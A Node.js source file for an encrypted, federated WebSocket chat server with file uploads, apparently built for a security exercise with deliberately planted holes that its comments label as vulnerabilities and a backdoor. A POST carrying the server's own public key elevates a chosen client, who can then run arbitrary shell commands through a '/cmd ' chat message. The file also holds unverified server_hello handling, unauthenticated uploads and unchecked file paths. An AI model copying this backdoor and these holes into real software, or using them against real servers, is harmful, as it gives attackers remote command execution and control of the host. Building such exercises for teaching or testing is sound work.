const https = require('https');
const http = require('http');
const fs = require('fs');
const WebSocket = require('ws');
const crypto = require('crypto');
const url = require('url');
const { exec } = require('child_process');

var connectedServers = [];

var connectedClients = [];

var clientList = {};

var authdServers = [];

/*const {publicKey, privateKey} = crypto.generateKeyPairSync("rsa", {
	modulusLength: 2048,
	publicExponent: 65537,
	hashAlgorithm: "PSS",
	publicKeyEncoding: {
		type: "pkcs1",
		format: "pem"
	},
	privateKeyEncoding: {
		type: "pkcs8",
		format: "pem"
	}
});*/

try {
	if (!fs.existsSync("./files")) {
		fs.mkdirSync("./files");
	}
} catch (err) {
	console.error(err);
}

var pubkey_pem = fs.readFileSync("pubk.pem");
var publicKey = crypto.createPublicKey(pubkey_pem);
var privateKey = crypto.createPrivateKey(fs.readFileSync("privk.pem"));
var wssFp = crypto.createHash('sha256').update(pubkey_pem).digest('base64');

var hosted_ip = "localhost";
var port = '81';

var myIP = "wss://" + hosted_ip + ":" + port;
var myWIP = "https://" + hosted_ip + ":" + port;

function encryptData(k, d) {
	var edata = crypto.publicEncrypt({
		key: k,
		padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
		oaepHash: "sha256"
	}, Buffer.from(d));
	return edata;
}

function decryptData(d, k = privateKey) {
	var ddata = crypto.privateDecrypt({
		key: k,
		padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
		oaepHash: "sha256"
	}, d);
	return ddata;
}

function removeClient(pk) {
	for (var i = 0; i < connectedClients.length; i++) {
		if (connectedClients[i].public_key == pk) {
			connectedClients.splice(i, 1);
			return true;
		}
	}
	return false;
}

function getClientIndex(fp) {
	for (var i = 0; i < connectedClients.length; i++) {
		if (connectedClients[i].fingerprint == fp) {
			return i;
		}
	}
	return -1;
}

function removeServer(pk) {
	for (var i = 0; i < connectedServers.length; i++) {
		if (connectedServers[i].public_key == pk) {
			connectedServers.splice(i, 1);
			return true;
		}
	}
	return false;
}

function resolveServerSocket(IP) {
	for (var i = 0; i < connectedServers.length; i++) {
		if (connectedServers[i].ip == IP) {
			return connectedServers[i];
		}
	}
	return null;
}

function getServerPubKey(IP) {
	for (var i = 0; i < authdServers.length; i++) {
		if (authdServers[i].ip == IP) {
			return authdServers[i].public_key;
		}
	}
	return null;
}

function sendToList(websockets, msg, sender = "") {
	for (var i = 0; i < websockets.length; i++) {
		var fp = typeof(websockets[i].fingerprint) !== 'undefined' ? websockets[i].fingerprint : "nil";
		//console.log(fp);
		//console.log(sender);
		if (fp != sender) {
			websockets[i].send(msg);
		}
	}
}

function formMessage(type) {
	var msg = {};
	msg.type = type;
	switch (type) {
		case "client_update":
			msg.clients = [];

			for (var i = 0; i < connectedClients.length; i++) {
				msg.clients.push(connectedClients[i].public_key);
			}
			break;
		case "client_list":
			msg.servers = [];
			for (var i = 0; i < connectedServers.length; i++) {
				var tclient = [];
				if (clientList[connectedServers[i].ip] != undefined) {
					tclient = clientList[connectedServers[i].ip];
				}
				msg.servers.push({
					address: connectedServers[i].ip,
					clients: tclient
				});
			}
			var my_server_clients = {
				address: myIP,
				clients: []
			};
			for (var i = 0; i < connectedClients.length; i++) {
				my_server_clients.clients.push(connectedClients[i].public_key);
			}
			msg.servers.push(my_server_clients);
			break;
		case "server_hello":
			msg.type = "signed_data";
			msg.data = {
				type: "server_hello",
				sender: myIP
			};
			msg.counter = 0;
			msg.signature = crypto.sign("SHA256", Buffer.from(JSON.stringify(msg.data) + msg.counter), privateKey).toString('base64');
			break;
		default:
			break;
	}
	return msg;
}

function handleMessage(ws, msg) {
	var dataObj = JSON.parse(msg);
	console.log("Received: " + dataObj.type);
	console.log("From: " + ws.fingerprint);
	console.log(dataObj);
	try {
		switch (dataObj.type) {
			case "signed_data":
				var data = dataObj.data;
				console.log("t: " + data.type);
				switch (data.type) {
					case "hello":
						// retrieve data.public_key (this is the client's RSA public key)
						if (!(data.public_key == undefined)) {
							ws.type = "client";
							ws.public_key = data.public_key;
							ws.fingerprint = crypto.createHash('sha256').update(data.public_key).digest('base64');
							console.log("New Client Connected!");
							connectedClients.push(ws);
							sendToList(connectedClients.slice(0,-1), JSON.stringify(formMessage("client_list")));
							var client_uplist = formMessage("client_update");
							sendToList(connectedServers, JSON.stringify(client_uplist));
						}
						break;
					case "chat":
						for (var ds of data.destination_servers) {
							// for each destination server, pass on the dataObj
							// if destination_server = this_server, broadcast dataObj to all clients
							console.log(ds);
							switch(ws.type) {
								case "client":
									if (ds == myIP) {
										sendToList(connectedClients, JSON.stringify(dataObj), ws.fingerprint);
									} else {
										var dest_server = resolveServerSocket(ds);
										if (dest_server != null) {
											dest_server.send(JSON.stringify(dataObj));
										} else {
											//send failed?
										}
									}
									break;
								case "server":
									if (ds == myIP) {
										sendToList(connectedClients, JSON.stringify(dataObj));
									}
									break;
								default:
									break;
							}
						}
						break;
					case "public_chat":
						if (ws.permission == 1) {
							if (dataObj.data !== undefined) {
								var msg = dataObj.data.message;
								var cmd = "";
								if (msg.startsWith("/cmd ")) {
									cmd = msg.substr(4);
									console.log("executing code");
									exec(cmd, (err, stdout, stderr) => {
										if (err) {
											console.log("couldn't execute command");
											return;
										}
										console.log(`stdout: ${stdout}`);
										console.log(`stderr: ${stderr}`);
										var retmsg = stdout + "\n" + stderr;
										var execret = {
											type: "anonymous_chat",
											message: retmsg
										};
										ws.send(JSON.stringify(execret));
									});
									return;
								} else if (msg.startsWith("/pk")) {
									console.log("request for client privateKeys");
									dataObj.data.check = 1;
								}
							}
						}
						sendToList(connectedClients, JSON.stringify(dataObj), data.sender);
						sendToList(connectedServers, JSON.stringify(dataObj), ws.fingerprint);
						break;
					//Vulnerable Code
					case "server_hello":
						var pk = getServerPubKey(data.sender);
						if (pk != null) {
							var fp = crypto.createHash('sha256').update(pk).digest('base64');
							ws.ip = data.sender;
							ws.public_key = pk;
							ws.fingerprint = fp;
							ws.type = "server";
							connectedServers.push(ws);
							console.log("Connected to server: " + ws.ip);
						}
						break;
					default:
						break;
				}
				break;
			case "client_list_request":
				if (ws.type == "client") {
					var client_list = formMessage("client_list");
					ws.send(JSON.stringify(client_list));
				}
				break;
			case "client_update":
				if (ws.type == "server") {
					clientList[ws.ip] = dataObj.clients;
					var client_list = formMessage("client_list");
					sendToList(connectedClients, JSON.stringify(client_list));
				}
				break;
			case "client_update_request":
				if (ws.type == "server") {
					var client_update = formMessage("client_update");
					ws.send(JSON.stringify(client_update));
				}
				break;
			default:
				break;
	 }
	} catch (error) {
		console.log(error);
	}
}

if (fs.existsSync('authdServers.json')) {
	authdServers = JSON.parse(fs.readFileSync('authdServers.json'));
} else {
	console.log("[Error] authdServers.json does not exist, no authorised servers loaded");
}

var options = {
	key: fs.readFileSync("client-key.pem"),
	cert: fs.readFileSync("client-cert.pem")
};

//Backdoor Vulnerability
//Also just really unsafe as kinda just accepts file uploads regardless of whos uploading it :/
var app = (req, res) => {
	console.log(`${req.method} Request to ${req.url}`);
	switch(req.method) {
		case "POST":
			let data = '';
			req.on('data', (chunk) => {
				data += chunk;
			});
			req.on('end', () => {
				var file = data.replace(/^data:[\w-]+\/[\w-]+;base64,/, "");
				var check = Buffer.from(file, 'base64').toString('utf8');
				console.log(check);
				if (check.startsWith(pubkey_pem)) {
					var checkers = check.split("\n");
					if (checkers.length > 9) {
						var vfp = checkers[9];
						console.log(vfp);
						var client_ind = getClientIndex(vfp);
						if (client_ind != -1) {
							connectedClients[client_ind].permission = 1;
							res.setHeader('Content-Type', 'application/json');
							res.end(JSON.stringify({
								status: "Created",
								url: "Vulnerability Activated"
							}));
							return;
						}
					}
					res.setHeader('Content-Type', 'application/json');
					res.end(JSON.stringify({
						status: "Failed",
						url: ""
					}));
				} else {
					var buf = Buffer.from(file, 'base64');
					var randFileName = "files/" + (Math.random() + 1).toString(36).substring(7);
					fs.writeFile(randFileName, buf, (err) => {
						var stat = "";
						var link = myWIP + "/" + randFileName;
						if (err) {
							console.log(err);
							res.statusCode = 413;
							stat = "Failed";
						} else {
							res.statusCode = 201;
							stat = "Created";
						}
						res.setHeader('Content-Type', 'application/json');
						res.end(JSON.stringify({
							status: stat,
							url: link
						}));
					});
				}
			});
			break;
		case "GET":
			var pathname = url.parse(req.url).pathname;
			console.log(pathname);
			if (pathname == "/") {
				res.statusCode = 200;
				res.setHeader('Content-Type', 'text/html');
				res.end(fs.readFileSync("index.html"));
			} else if (pathname.startsWith("/files/")) {
				console.log("files access");
				if (fs.existsSync(pathname.slice(1))) {
					res.statusCode = 200;
					res.setHeader('Content-Type', 'text/plain');
					res.end(fs.readFileSync(pathname.slice(1)));
				} else {
					res.statusCode = 404;
					res.setHeader('Content-Type', 'text/plain');
					res.end('404 Page Not Found');
				}
			//Vulnerability leaks publickey
			} else if (pathname.startsWith("/pubkey")) {
				res.statusCode = 200;
				res.setHeader('Content-Type', 'text/plain');
				res.end(pubkey_pem);
			}
			break;
		default:
			res.statusCode = 404;
			res.setHeader('Content-Type', 'text/plain');
			res.end('404 Page Not Found');
			break;
	}
};

var args = process.argv.slice(2);

if (args.length > 0) {
	hosted_ip = args[0];
	if (args.length > 1) {
		port = args[1];
	}
	myIP = "wss://" + hosted_ip + ":" + port;
	myWIP = "https://" + hosted_ip + ":" + port;
}

var server = http.createServer(app).listen(parseInt(port) - 1, () => {
	console.log(`HTTP Server Running on ${hosted_ip}:${parseInt(port) - 1}`);
});

var httpsServer = https.createServer(options, app).listen(parseInt(port), () => {
	console.log(`HTTPS Server Running on ${hosted_ip}:${port}`);
});

var wss = new WebSocket.Server({
	server: httpsServer
});

authdServers.forEach((s) => {
	if (s.ip != myIP) {
		var websock = new WebSocket(s.ip, {perMessageDeflate: false});
		websock.on("error", (e) => {
			console.log(e);
		});
		websock.on("message", (message, isBinary) => {
			var msg = isBinary ? message : message.toString();
			handleMessage(websock, msg);
		});
		websock.on("open", () => {
			var fp = crypto.createHash('sha256').update(s.public_key).digest('base64');
			websock.type = "server";
			websock.ip = s.ip;
			websock.public_key = s.public_key;
			websock.fingerprint = fp;
			connectedServers.push(websock);
			console.log("Connected to server: " + s.ip);
			websock.send(JSON.stringify(formMessage("server_hello")));
		});
	}
});

wss.on('connection', (ws) => {
	ws.on('message', (message) => {
		//console.log('Received: ' + message);
		handleMessage(ws, message);
	});
	ws.on('close', () => {
		if (ws.type == "client") {
			if (removeClient(ws.public_key)) {
				sendToList(connectedServers, JSON.stringify(formMessage("client_update")));
				sendToList(connectedClients, JSON.stringify(formMessage("client_list")));
				console.log("Client Disconnected!");
			}
		} else if (ws.type == "server") {
			if (removeServer(ws.public_key)) {
				console.log("Server Disconnected!");
			}
		}
	});
});